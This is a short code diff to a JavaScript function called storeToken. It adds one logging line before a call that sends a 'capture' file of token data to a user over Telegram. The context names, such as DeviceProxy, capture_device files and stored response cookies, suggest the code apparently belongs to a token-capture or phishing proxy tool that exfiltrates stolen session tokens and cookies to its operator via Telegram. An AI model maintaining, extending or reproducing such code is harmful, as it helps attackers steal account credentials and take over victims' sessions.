@@ -707,6 +707,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
       const fileContent = buildCaptureFileContent(reportData);
       const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
 
+      console.log(`[DeviceProxy] Sending Telegram report for token ${tokenId} type=${reportTokenType}`);
       await sendTelegramDocument(job.user_id, filename, fileContent, caption);
       console.log(`[DeviceProxy] Telegram report sent for token ${tokenId}`);
     } catch (telegramErr) {
